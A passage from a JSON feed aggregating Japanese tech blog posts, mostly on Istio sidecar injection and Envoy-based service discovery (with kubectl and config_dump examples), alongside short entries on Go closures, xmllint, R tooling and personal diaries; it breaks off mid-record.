kube-apiserverからレスポンスが返ってくるpod \\"foo-pod\\" created以降の仕組み(画像はタブ開き閲覧を推奨)kube-apiserverは、他のNodeコンポーネント (kube-controlleretcd、kube-scheduler、kubeletなど) と通信し、Podを作成します。このPodのマニフェストは、アプリコンテナの他に、istio-proxyコンテナとistio-initコンテナを持ちます。結果として、サイドカーコンテナのistio-proxyコンテナをインジェクションしたことになります。▶ kube-apiserverと他コンポーネントの通信についてKubernetes Master Components: Etcd, API Server, Controller Manager, and Scheduler | by Jorge Acetozi | jorgeacetozi | Medium05. おわりにサービスメッシュの登場とIstioのサイドカーインジェクションの仕組みをもりもり布教しました。Istioへの愛が溢れてしまいました。今回登場したMutatingAdmissionWebhookプラグインに関して、私の関わっているプロダクトではIstio以外 (例：CertManager、Prometheus、AWSのaws-eks-vpc-cniアドオンなど) でも使用しています✌️そのため、MutatingAdmissionWebhookプラグインをどのように使っているのかを一度知れば、知識の汎用性が高いと考えています。サイドカーインジェクションはIstioでも基本的な機能であり、もし未体験の方がいらっしゃれば、お手元でサイドカーコンテナが追加されることを確認していただくとよいかもしれません\uD83D\uDC4D記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","isoDate":"2023-01-14T13:38:15.000Z","dateMiliSeconds":1673703495000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"The Diary of fighting with COVID-19? Day-4","link":"https://daisuke1024akagawa.medium.com/the-diary-of-fighting-with-covid-19-day-4-dd2561d21338?source=rss-c54ac439ad2b------2","isoDate":"2023-01-14T11:25:46.000Z","dateMiliSeconds":1673695546000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"The Diary of fighting with COVID-19? Day-3","link":"https://daisuke1024akagawa.medium.com/the-diary-of-fighting-with-covid-19-day-3-fa8a830320d3?source=rss-c54ac439ad2b------2","isoDate":"2023-01-13T13:21:39.000Z","dateMiliSeconds":1673616099000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"xmllint で HTML 内の任意の値を取り出す","link":"https://blog.1q77.com/2023/01/xmllint-html-xpath/","contentSnippet":"サクッと shell script で HTML の中の何かを取り出したい時があります。そんな時に使えるのが xmllint.しっかりやるなら python の Beautiful Soup を使ったりしますが、本当に簡単なことを簡単にやりたい場合に xmllint でサクッとやったメモ。","isoDate":"2023-01-12T14:40:51.000Z","dateMiliSeconds":1673534451000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"The Diary of fighting with COVID-19? Day-2","link":"https://daisuke1024akagawa.medium.com/the-diary-of-fighting-with-covid-19-day-2-59fc403b0fea?source=rss-c54ac439ad2b------2","isoDate":"2023-01-12T13:20:43.000Z","dateMiliSeconds":1673529643000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"The Diary of fighting with COVID-19? Day-1","link":"https://daisuke1024akagawa.medium.com/the-diary-of-fighting-with-covid-19-day-1-3abeaf7e9399?source=rss-c54ac439ad2b------2","isoDate":"2023-01-11T13:35:26.000Z","dateMiliSeconds":1673444126000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"chezmoiを使って管理しているdotfileのファイルタイプをNeovimにうまく認識させる","link":"https://blog.atusy.net/2023/01/11/neovim-filetype-matching-with-chezmoi/","contentSnippet":"Neovimはファイルの名前や内容を元に、ファイルタイプを決定する機能を持っています。たとえば、拡張子が.shだったらシェルスクリプトだと判断できます。","isoDate":"2023-01-11T00:00:00.000Z","dateMiliSeconds":1673395200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"tidymodelsでOne-hot Encodingする","link":"https://blog.atusy.net/2023/01/06/tidymodels-one-hot-encoding/","contentSnippet":"きぬいとさんがtidyverseでOne-hot Encodingしているのを見ましたが、餅は餅屋でtidymodelsもいいよねという話。RでOne-hot Encodingをする with tidyverse","isoDate":"2023-01-06T00:00:00.000Z","dateMiliSeconds":1672963200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ぼちぼちブログでもはじめます","link":"https://moz-security.hatenablog.com/entry/2023/01/04/111143","contentSnippet":"もう新年始まって気づいたら４日目ですが、明けましておめでとうございます。アウトプットの場として2023年になり、気持ちを新たにして、なにか新しいことを始めようと思ったときに、前々からいつかやろうと思っていたブログを書くことに決めました。（いつかやろうを今やることは大事だと思う。）ここらへんで、一応、自己紹介しておきたいと思います。私は、現在、大学で情報理工学を学んでいて、ネットワークやセキュリティに興味を持っています。今までやってきたこととしては、B2のときに基本情報技術者試験、B3のときに応用情報技術者試験に合格し、他には、セキュリティ・ミニキャンプ オンライン・東京 に参加したり、Hack The Boxを少しずつやってきました。（秋学期になってからHTBはほとんど触れていないが…）他にも、いろんな勉強会にも参加してきました。今はオンラインで気軽に参加できるので。ブログを書こうかなと考えた理由は大きく３つありまして。１つ目は、セキュリティ・ミニキャンプのグループ活動でLT大会をしたときに、やっぱりアウトプットの場というのがあることで、より知識の定着につながることが実感できたからです。大学生になってからは、インプットがメインになっていてアウトプットの場がなかなかないため、どうアウトプットするのかというのは考える必要がありました。Twitterでもアウトプットはできるし、実際にそれを使っていましたが、文字数に制限があるため、正しく文章を書くには向いていません。（気楽にツイートできることがTwitterの良さではあるのですが。）２つ目は、自分の言語化能力の向上のためです。自分の頭には考えがあるのに、それをうまく伝えられなかったり、わかりにくい説明になっていたりしていたため、どうすればわかりやすく説明できるのかというのは前からの悩みでした。そこでいろいろ考えたときに自分の頭にあることを言語化するというのは、結構慣れの要素が大きいと思うため、経験を積むことが大事だという結論にいたり、それならば、早く始めた方がいいというのが、ブログを書くきっかけにもなっています。３つ目は、エンジニアになるなら、自分の技術力（今までどんなことをやってきたのか、私はどんなことができるのか）を証明するためにも技術ブログは書いておくといいということを聞くことが多いからです。今は、いきなり技術ブログを書くのは敷居が高いため、気楽に書けるこのHatena Blogでしか記事を書いていませんが、今年中には、QitaやZennの方に、技術系の記事を投稿していきたいと思っています。ブログを書く前に、Hatena Blogを使うかも結構迷っていて、自分で個人ブログサイトを作ろうかとも思ったのですが、そこに時間をかける前にさっさとブログを書き始めようということで、こちらを選択しました。そのため、今年中には、個人のブログサイトを作ってそちらに移行したいと思っています。（願望）このHatena Blogでは、月に１回は投稿していく予定です。内容としては、その月にやってきたこととか新たな発見があったこと、自分の書きたいことを勝手に発信していく感じで。ここであらかじめ宣言しておくことで、自分を追い込んでいくスタイル。（笑）技術的な話は、QiitaやZennの方に書くかもしれませんが、もしかしたら、こっちで書くかもしれません。全然考えていないため、そこら辺はこれから考えていきたいと思います。とりあえず、人生初めてのブログは、こんな感じで終わりたいと思います。近々、新年の抱負として、今年やりたいことを書きたいと思っています。","isoDate":"2023-01-04T02:11:43.000Z","dateMiliSeconds":1672798303000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Lima の vmType VZ と virtiofs を試す","link":"https://blog.1q77.com/2022/12/lima-vz/","contentSnippet":"Lima が version 0.14.0 で QEMU だけではなく macOS の Virtualization.Framework に対応していました。vmtype という設定項目が増えています。この新しい Framework では Host のディレクトリをマウントするのに virtiofs が使えるようになっており、QEMU での reverse-sshfs や 9p よりもパフォーマンスが良いらしいので試してみます。","isoDate":"2022-12-29T15:49:47.000Z","dateMiliSeconds":1672328987000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"クロージャーのメモリ割り当てについて(Go言語)","link":"https://kechigon.hatenablog.com/entry/2022/12/29/203946","contentSnippet":"A Tour of GoでGo言語に入門していて、クロージャーのメモリ割り当てについて疑問に思ったので調べた。クロージャーとはA Tour of Go での説明をまとめると、本体の外部から変数を参照する関数値関数は、参照した変数にアクセスして割り当てることができるという特徴がある。サンプルコードpackage mainimport \\"fmt\\"func adder() func() int {    sum := 0    return func() int {        sum++        return sum    }}func main() {    f := adder()    for i := 0; i < 10; i++ {        fmt.Println(f())    }}出力12345678910adder 関数はクロージャーを返し、各クロージャーは、sum 変数にバインドされている。疑問点サンプルコードではクロージャーが、adder関数で定義されたsum変数を参照、割り当てしてる。しかし、関数呼び出しといえばスタックフレームを用いるイメージしかない私にとっては、sum変数の参照がどこに残っているのか疑問。おそらくヒープ領域に割り当てられてる？GitHub issue でのやり取り調べたところ、同じ疑問に答えているissueを見つけた。質問者は、同じような処理をクロージャーを使用する場合と使用しない場合で試している。そして、クロージャーを使用した場合だとヒープ領域への割り当てが行われると言っている。実際のコードpackage mainimport (    \\"fmt\\"    \\"sync\\"    \\"testing\\")type Object struct {}var p sync.Pool = sync.Pool{    New: func() interface{} {        return &Object{}    },}type Func struct {    ctx interface{}}func (this *Func) Run() {    p.Put(this.ctx)  }func RunWithFunc() Func {    ctx := p.Get()    return Func{ctx: ctx}}func RunWithClosure() func() {    ctx := p.Get()    return func() { p.Put(ctx) }}func Test1() {    cleanup := RunWithFunc()    cleanup.Run()}func Test2() {    cleanup := RunWithClosure()    cleanup()}func main() {    f1 := testing.AllocsPerRun(1000, Test1)    f2 := testing.AllocsPerRun(1000, Test2)    // 0    fmt.Println(f1)    // 1    fmt.Println(f2)}コードの詳しい内容は、クロージャーを使わないRunWithFuncと使用するRunWithClosureを実行する。どちらも大雑把に言うと、空の構造体をsync.Poolから取り出したり戻したりする。クロージャーを使うとヒープ領域への割り当てが行われることをtesting.AllocsPerRunが示す。といった感じ。回答者は以下のように言っている。問題は、RunWithClosure がクロージャーを返す必要があることです。関数が実行される前にスタック フレームがなくなるため、スタックに割り当てることができません。 可能な場合は、スタックにクロージャーを割り当てます。スタック上にクロージャ（これらの2つのフィールドの匿名構造体）を割り当て、呼び出された関数にそれらへのポインタを渡すことができますし、実際に行っています。ここでの問題は、その構造体がRunWithClosureの内部で割り当てられ、RunWithClosureのフレームは、cleanupを呼び出すまでになくなってしまうことです。そのため、RunWithClosureのフレームでクロージャを割り当てることはできません。それは、ヒープ上に割り当てられなければなりません。もし、RunWithClosureをその呼び出し元にインライン化すれば、そのスタック・フレームが十分に長く生きるので、呼び出し元でクロージャを割り当てることができるようになります。クロージャーが実行される前に、参照先をもつスタックフレームがなくなってしまう場合、それをヒープ領域に割り当てるらしい。またそれを避けたい場合は、関数になっている部分をインライン化するといいらしい。まとめGo言語に入門していて、クロージャーが参照している変数がどこに残っているか疑問に思ったが、GitHub issueのやり取りから、予想した通り、ヒープ領域への割り当てが行われていることがわかった。","isoDate":"2022-12-29T11:39:46.000Z","dateMiliSeconds":1672313986000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"rbspy で ruby の stacktrace を flamegraph にする","link":"https://blog.1q77.com/2022/12/rbspy/","contentSnippet":"中身をよく知らない Rails アプリでどこが遅いのかな？と思って rbspy (github) を試してみたのでメモ。とりあえず使って flamegraph を書き出してみたんだけどそもそも flamegraph がどういうものなのか分かってなくて困ったのでドキュメントを読んでみた。","isoDate":"2022-12-28T11:26:10.000Z","dateMiliSeconds":1672226770000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Professional Cloud Security Engineer の振り返り","link":"https://qiita.com/dirtymosschan/items/2c66eec7919220a4ec06","contentSnippet":"はじめに2022/12/28 に Google Cloud Certification の１つである、Professional Cloud Security Engineer に合格したので、そち…","isoDate":"2022-12-28T08:57:17.000Z","dateMiliSeconds":1672217837000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"rticlesパッケージで作成する文書の参考文献の位置を変える","link":"https://blog.atusy.net/2022/12/28/rticles-reference-location/","contentSnippet":"R Markdownの参考文献は通常では文書末尾に挿入されます。しかし、多くの場合は挿入場所を、以下の呪文を唱えた場所に変更できます。::: {#refs}:::これは、R Markdownの拡張元となっているMarkdown方言（Pandoc’s Markdown）の機能です。","isoDate":"2022-12-28T00:00:00.000Z","dateMiliSeconds":1672185600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"rstudioapi::registerChunkCallbackが面白い","link":"https://blog.atusy.net/2022/12/26/rstudioapi-registerchunkcallback/","contentSnippet":"rstudioapiパッケージにはRStudioを操作する様々な関数があります。registerChunkCallbackという関数が面白かったのでちょっと実験しました。","isoDate":"2022-12-26T00:00:00.000Z","dateMiliSeconds":1672012800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"【Istio⛵️】Istioのサービス間通信を実現するサービスディスカバリーの仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2022/12/25/060000","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️サービスディスカバリーの種類についてIstioのサービス間通信を実現するサービスディスカバリーの仕組みについて記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. サービスディスカバリーについてマイクロサービスアーキテクチャにおけるサービスディスカバリーサービスディスカバリーとはなぜサービスディスカバリーが必要なのかサービスディスカバリーの要素サービスディスカバリーのパターンサービスディスカバリーのパターンとはサーバーサイドパターンクライアントサイドパターン03. Istioのサービスディスカバリーの仕組み全体像(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得(4) istio-proxyコンテナによるリクエスト受信(5) istio-proxyコンテナによるロードバランシングdiscoveryコンテナの仕組み(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナの仕組み(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得(4) istio-proxyコンテナによるリクエスト受信(5) istio-proxyコンテナによるリクエスト受信04. istio-proxyコンテナ内のEnvoyの仕組み全体像(1) 送信元マイクロサービスからリクエスト受信(2) Envoyによるリスナー選択(3) Envoyによるルート選択(4) Envoyによるクラスター選択(5) Envoyによるエンドポイント選択(6) 宛先マイクロサービスへのリクエスト送信EnvoyがADS-APIから取得した宛先情報を見てみようconfig_dumpエンドポイントリスナー▼ 確認方法▼ 結果ルート▼ 確認方法▼ 結果クラスター▼ 確認方法▼ 結果エンドポイント▼ 確認方法▼ 結果Envoyの処理の流れのまとめ(1) 送信元マイクロサービスからリクエスト受信(2) Envoyによるリスナー選択(3) Envoyによるルート選択(4) Envoyによるクラスター選択(5) Envoyによるクラスター選択(6) 宛先マイクロサービスへのリクエスト送信05. おわりに謝辞記事関連のおすすめ書籍01. はじめに推し (Istio) が尊い\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F3-shake Advent Calender 2022 最終日の記事です\uD83C\uDF85普段、私は 俺の技術ノート に知見を記録しており、はてなブログはデビュー戦となります。最近の業務で、オンプレとAWS上のIstio⛵️をひたすら子守りしています。今回は、子守りの前提知識の復習もかねて、Istioのサービス間通信を実現するサービスディスカバリーの仕組みを記事で解説しました。Istioの機能の1つであるサービスディスカバリーは、その仕組みの多くをEnvoyに頼っているため、合わせてEnvoyの仕組みも説明します。それでは、もりもり布教していきます\uD83D\uDE1702. サービスディスカバリーについてマイクロサービスアーキテクチャにおけるサービスディスカバリーサービスディスカバリーとは平易な言葉で言い換えると サービス間通信 です。マイクロサービスアーキテクチャでは、マイクロサービスからマイクロサービスにリクエストを送信する場面があります。サービスディスカバリーとは、宛先マイクロサービスの宛先情報 (例：IPアドレス、完全修飾ドメイン名など) を検出し、送信元マイクロサービスが宛先マイクロサービスにリクエストを継続的に送信可能にする仕組みのことです。なぜサービスディスカバリーが必要なのかそもそも、なぜサービスディスカバリーが必要なのでしょうか。マイクロサービスアーキテクチャでは、システムの信頼性 (定められた条件下で定められた期間にわたり、障害を発生させることなく実行する程度) を担保するために、マイクロサービスのインスタンスの自動スケーリングを採用します。この時、自動スケーリングのスケールアウトでマイクロサービスが増加するたびに、各インスタンスには新しい宛先情報が割り当てられてしまいます。また、マイクロサービスが作り直された場合にも、宛先情報は更新されてしまいます。このように、たとえインスタンスの宛先情報が更新されたとしても、インスタンスへのリクエストに失敗しない仕組みが必要です。サービスディスカバリーの要素サービスディスカバリーの仕組みは、次の要素からなります。名前解決は、DNSベースのサービスディスカバリー (例：CoreDNS + Service + kube-proxyによるサービスディスカバリー) で必要となり、Istioでは使いません。そのため、本記事では言及しないこととします\uD83D\uDE47\uD83C\uDFFB‍ 要素                    責務                                                              送信元マイクロサービス  リクエストを送信する。                                            宛先マイクロサービス    リクエストを受信する。                                            サービスレジストリ      宛先マイクロサービスの宛先情報を保管する。                        ロードバランサー        宛先マイクロサービスのインスタンスにロードバランシングする。      名前解決                宛先マイクロサービスへのリクエスト送信時に、名前解決可能にする。 サービスディスカバリーのパターンサービスディスカバリーのパターンとはサービスディスカバリーの実装方法にはいくつか種類があります。Istioのサービスディスカバリーは、このうちのサーバーサイドパターンを実装したものになります。サーバーサイドパターン送信元マイクロサービスから、問い合わせとロードバランシングの責務が切り離されています。送信元マイクロサービスは、ロードバランサーにリクエストを送信します。ロードバランサーは、宛先マイクロサービスの場所をサービスレジストリに問い合わせ、またリクエストをロードバランシングする責務を担っています\uD83D\uDCAA\uD83C\uDFFB(例) Istio、Linkerd、CoreDNS、AWS ALBなどCloud Native Patterns: Designing change-tolerant software (English Edition)Pattern: Server-side service discoveryクライアントサイドパターン通信の送信元マイクロサービスは、宛先マイクロサービスの場所をサービスレジストリに問い合わせ、さらにロードバランシングする責務を担います。(例) NetflixのEureka、kube-proxyなどCloud Native Patterns: Designing change-tolerant software (English Edition)Pattern: Client-side service discoveryService Discovery in Kubernetes: Combining the Best of Two Worlds03. Istioのサービスディスカバリーの仕組みIstioが実装するサービスメッシュには、サイドカープロキシメッシュとアンビエントメッシュがあり、今回はサイドカープロキシメッシュのサービスディスカバリーを取り上げます。Istioのサービスディスカバリーは、discoveryコンテナとistio-proxyコンテナが軸となり、サーバーサイドパターンのサービスディスカバリーを実装します。全体像(1) 〜 (6) の全体像は、以下の通りです\uD83D\uDC47istio-proxyコンテナは、サービスレジストリへの問い合わせと、ロードバランシングする責務を担っていることに注目してください。(1) kube-apiserverによる宛先情報保管kube-apiserverは、Pod等の宛先情報をetcd等に保管します。これは、Kubernetesの通常の仕組みです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナは、kube-apiserverからPod等の宛先情報を取得し、自身に保管します。(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナは、discoveryコンテナからPod等の宛先情報を双方向ストリーミングRPCで取得します。(4) istio-proxyコンテナによるリクエスト受信送信元マイクロサービスがリクエストを送信します。サーバーサイドパターンでの責務通り、送信元マイクロサービスはロードバランサー (ここではistio-proxyコンテナ) にリクエストを送信します。この時、送信元マイクロサービスがistio-proxyコンテナに直接的にリクエストを送信しているというよりは、iptablesがistio-proxyコンテナにリクエストをリダイレクトします。istio-proxyコンテナこれを受信します。(5) istio-proxyコンテナによるロードバランシングistio-proxyコンテナは、リクエストをロードバランシングし、また宛先Podに送信します。Istio in ActionJimmy SongTech-赵化冰的博客 | Zhaohuabing Blogdiscoveryコンテナの仕組み全体像の中から、discoveryコンテナを詳しく見てみましょう。discoveryコンテナは、別名Istiodと呼ばれています。XDS-APIというエンドポイントを公開しており、XDS-APIのうち、サービスディスカバリーに関係するAPIは以下の通りです。今回は詳しく言及しませんが、istio-proxyコンテナがHTTPSリクエストを処理するために、証明書を配布するためのSDS-APIもあります。 APIの種類  説明                                                   LDS-API    Envoyのリスナーを取得できる。                          RDS-API    Envoyのルートを取得できる。                            CDS-API    Envoyのクラスターを取得できる。                        EDS-API    Envoyのエンドポイントできる。                          ADS-API    各XDS-APIから取得できる宛先情報を整理して取得できる。 Istio in Action(1) kube-apiserverによる宛先情報保管kube-apiserverによる宛先情報保管 と同じです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナによる宛先情報保管 と同じです。(3) istio-proxyコンテナによる宛先情報取得XDS-APIとistio-proxyコンテナの間では、gRPCの双方向ストリーミングRPCの接続が確立されています。そのため、istio-proxyコンテナからのリクエストに応じて宛先情報を返却するだけでなく、リクエストがなくとも、XDS-APIからもistio-proxyコンテナに対して宛先情報を送信します。XDS-APIのエンドポイントがいくつかあり、各エンドポイントから宛先情報を取得できます。一方で、各エンドポイントからバラバラに宛先情報を取得すると、Envoy上でこれを整理する時に、宛先情報のバージョンの不整合が起こる可能性があります。そのため、Istioは実際にはADS-APIを使用して宛先情報を取得します。istio-proxyコンテナの仕組み全体像の中から、istio-proxyコンテナを詳しく見てみましょう。Istio in ActionJimmy SongTech-赵化冰的博客 | Zhaohuabing Blog(1) kube-apiserverによる宛先情報保管kube-apiserverによる宛先情報保管 と同じです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナによる宛先情報保管 と同じです。(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナでは、pilot-agentとEnvoyが稼働しています。先ほどistio-proxyコンテナは、双方向ストリーミングRPCでADS-APIから宛先情報を取得すると説明しました。厳密にはEnvoyが、pilot-agentを介して、ADS-APIから双方向ストリーミングRPCで宛先情報を取得します。(4) istio-proxyコンテナによるリクエスト受信istio-proxyコンテナによるリクエスト受信 と同じです。(5) istio-proxyコンテナによるリクエスト受信EnvoyはADS-APIから取得した宛先情報に基づいて、宛先マイクロサービスのインスタンスにロードバランシングします。04. istio-proxyコンテナ内のEnvoyの仕組み全体像EnvoyがADS-APIから取得した宛先情報を見ていく前に、Envoyの処理の流れを解説します。istio-proxyコンテナ内のEnvoyでは、以下の仕組みでHTTPリクエストを処理します。(1) 〜 (6) の全体像は、以下の通りです\uD83D\uDC47Istio in Action (English Edition)Istio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and ObserveArchitecture Analysis of Istio: The Most Popular Service Mesh Project - Alibaba Cloud Community(1) 送信元マイクロサービスからリクエスト受信istio-proxyコンテナは、送信元マイクロサービスからリクエストを受信します。(2) Envoyによるリスナー選択Envoyは、リクエストの宛先情報 (例：宛先IPアドレス、ポート番号、パス、ホストなど) に応じてリスナーを選びます。(3) Envoyによるルート選択Envoyは、リスナーに紐づくルートを選びます。▶ TCPリクエストを処理する場合についてDebugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPT(4) Envoyによるクラスター選択Envoyは、クラスターに紐づくクラスターを選びます。(5) Envoyによるエンドポイント選択Envoyは、クラスターに紐づくエンドポイントを選びます。(6) 宛先マイクロサービスへのリクエスト送信Envoyは、エンドポイントに対応するインスタンスにリクエストを送信します。Envoyで確認した宛先情報を\uD83D\uDC46に当てはめて見ていくことにしましょう。EnvoyがADS-APIから取得した宛先情報を見てみようconfig_dumpエンドポイント実際にEnvoyに登録されている宛先情報は、istio-proxyコンテナ自体のlocalhost:15000/config_dumpからJSON形式で取得できます。もしお手元にIstioがある場合は、Envoyにどんな宛先情報が登録されているか、Envoyを冒険してみてください。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump\\" | yq -P▶ 宛先情報を見やすくするyqコマンドについてyqコマンドでYAMLに変換すると見やすくなります\uD83D\uDC4Dリスナー▼ 確認方法istio-proxyコンテナがADS-APIから取得したリスナーは、/config_dump?resource={dynamic_listeners}から確認できます。ここでは、foo-pod内でbar-podのリスナーを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_listeners}\\" | yq -P▼ 結果以下を確認できました。宛先IPアドレスや宛先ポート番号に応じてリスナーを選べるようになっており、ここでは<任意のIPアドレス>:50002。リスナーに紐づくルートの名前configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ListenersConfigDump.DynamicListener    # リスナー名    name: 0.0.0.0_50002    active_state:      version_info: 2022-11-24T12:13:05Z/468      listener:        \\"@type\\": type.googleapis.com/envoy.config.listener.v3.Listener        name: 0.0.0.0_50002        address:          socket_address:            # 受信したパケットのうちで、宛先IPアドレスでフィルタリング            address: 0.0.0.0            # 受信したパケットのうちで、宛先ポート番号でフィルタリング            port_value: 50002        filter_chains:          - filter_chain_match:              transport_protocol: raw_buffer              application_protocols:                - http/1.1                - h2c            filters:              - name: envoy.filters.network.http_connection_manager                typed_config:                  \\"@type\\": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager                  stat_prefix: outbound_0.0.0.0_50001                  rds:                    config_source:                      ads: {}                      initial_fetch_timeout: 0s                      resource_api_version: V3                    # 本リスナーに紐づくルートの名前                    route_config_name: 50002  ...  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ListenersConfigDump.DynamicListener  ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentationルート▼ 確認方法istio-proxyコンテナがADS-APIから取得したリスナーは、/config_dump?resource={dynamic_route_configs}から確認できます。ここでは、foo-pod内でbar-podのルートを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_route_configs}\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。リスナーを取得した時に確認できたルートの名前リクエストのパスやHostヘッダーに応じてルートを選べるようになっているルートに紐づくクラスターの名前configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.RoutesConfigDump.DynamicRouteConfig    version_info: 2022-11-24T12:13:05Z/468    route_config:      \\"@type\\": type.googleapis.com/envoy.config.route.v3.RouteConfiguration      # ルートの名前      name: 50002      virtual_hosts:        - name: bar-service.bar-namespace.svc.cluster.local:50002          # ホストベースルーティング          domains:            - bar-service.bar-namespace.svc.cluster.local            - bar-service.bar-namespace.svc.cluster.local:50002            - bar-service            - bar-service:50002            - bar-service.bar-namespace.svc            - bar-service.bar-namespace.svc:50002            - bar-service.bar-namespace            - bar-service.bar-namespace:50002            - 172.16.0.2            - 172.16.0.2:50002          routes:            - match:                # パスベースルーティング                prefix: /              route:                # 本ルートに紐づくクラスターの名前                cluster: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local                timeout: 0s                retry_policy:                  retry_on: connect-failure,refused-stream,unavailable,cancelled,retriable-status-codes                  num_retries: 2                  retry_host_predicate:                    - name: envoy.retry_host_predicates.previous_hosts                  host_selection_retry_max_attempts: \\"5\\"                  retriable_status_codes:                    - 503                max_stream_duration:                  max_stream_duration: 0s                  grpc_timeout_header_max: 0s              decorator:                operation: bar-service.bar-namespace.svc.cluster.local:50002/*  ...  - \'@type\': type.googleapis.com/envoy.admin.v3.RoutesConfigDump.DynamicRouteConfig  ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentationクラスター▼ 確認方法istio-proxyコンテナがADS-APIから取得したクラスターは、/config_dump?resource={dynamic_active_clusters}から確認できます。ここでは、foo-pod内でbar-podのクラスターを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_clusters}\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。ルートを取得した時に確認できたクラスターの名前クラスターに紐づくエンドポイントの親名configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ClustersConfigDump.DynamicCluster    version_info: 2022-11-24T12:13:05Z/468    cluster:      \\"@type\\": type.googleapis.com/envoy.config.cluster.v3.Cluster      # クラスターの名前      name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local      type: EDS      eds_cluster_config:        eds_config:          ads: {}          initial_fetch_timeout: 0s          resource_api_version: V3        # 本クラスターに紐づくエンドポイントの親名        service_name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local  ...  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ClustersConfigDump.DynamicCluster  ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentationエンドポイント▼ 確認方法istio-proxyコンテナがADS-APIから取得したクラスターは、/config_dump?include_edsから確認できます。ここでは、foo-pod内でbar-podのクラスターを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?include_eds\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。クラスターを取得した時に確認できたエンドポイントの親名bar-podのインスタンスが3個あるため、3個のエンドポイントがありますconfigs:  dynamic_endpoint_configs:    - endpoint_config:        \\"@type\\": type.googleapis.com/envoy.config.endpoint.v3.ClusterLoadAssignment        # エンドポイントの親名        cluster_name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local        endpoints:          - locality:              region: ap-northeast-1              zone: ap-northeast-1a            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.1                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1          - locality:              region: ap-northeast-1              zone: ap-northeast-1d            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.2                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1          - locality:              region: ap-northeast-1              zone: ap-northeast-1d            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 